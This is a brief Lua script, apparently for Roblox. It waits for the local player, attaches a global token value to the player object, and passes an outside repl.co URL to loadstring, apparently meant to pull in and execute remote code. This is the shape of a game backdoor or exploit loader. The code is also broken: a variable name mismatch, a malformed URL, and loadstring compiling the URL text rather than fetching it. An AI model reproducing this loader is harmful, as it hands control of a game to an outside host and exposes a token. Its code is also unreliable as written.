repeat wait() until game.Players.LocalPlayer --Wait until player loaded

--Locals
local sa_Instance
local player
local ip

--Assign
player = game.Players.LocalPlayer
sa_instance = Instance.new("StringValue")
sa_instance.Value = _G.GlobalToken
sa_instance.Parent = player
ip = "https://.starvdog.repl.co"

--Connect
loadstring(ip)
